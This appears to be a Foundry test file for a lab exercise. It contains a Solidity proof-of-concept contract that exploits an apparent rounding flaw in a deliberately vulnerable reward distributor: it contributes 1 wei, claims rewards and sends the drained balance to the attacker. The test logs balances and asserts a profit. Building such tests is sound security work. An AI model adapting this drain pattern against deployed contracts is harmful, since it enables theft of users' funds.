// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/RewardDistributor.sol";

contract FloatingPointExploit {
    VulnerableRewardDistributor public target;

    constructor(address _target) {
        target = VulnerableRewardDistributor(payable(_target));
    }

    function exploit() external payable {
        require(msg.value == 1 wei, "Exploit requires exactly 1 wei");

        // Contribute 1 wei to the vulnerable contract
        target.contribute{value: 1 wei}();

        // Claim rewards
        target.claimReward();

        // Transfer profits to the attacker
        payable(msg.sender).transfer(address(this).balance);
    }

    // Fallback to accept rewards
    receive() external payable {}
}

contract FloatingPointTest is Test {
    VulnerableRewardDistributor public distributor;
    FloatingPointExploit public attacker;

    function setUp() public {
        distributor = new VulnerableRewardDistributor();
        attacker = new FloatingPointExploit(address(distributor));

        // Fund the reward pool
        vm.deal(address(distributor), 20 ether);
    }

    function testFloatingPointExploit() public {
        uint256 initialAttackerBalance = address(0x123).balance;

        uint256 rewardPoolBefore = address(distributor).balance;

        // Execute the attack
        vm.prank(address(0x123)); // Simulate attacker
        vm.deal(address(0x123), 1 wei);
        attacker.exploit{value: 1 wei}();

        uint256 finalAttackerBalance = address(0x123).balance;
        uint256 rewardPoolAfter = address(distributor).balance;

        console.log("Reward Pool Before Attack: ", rewardPoolBefore);
        console.log("Reward Pool After Attack: ", rewardPoolAfter);
        console.log(
            "Attacker initial Balance: ",
            initialAttackerBalance);
        console.log(
            "Attacker new Balance: ",
            finalAttackerBalance);
        // console.log(
        //     "Attacker's Profit: ",
        //     finalAttackerBalance - initialAttackerBalance
        // );

        // Assert that the attacker profited
        assert(finalAttackerBalance > initialAttackerBalance);
    }
}
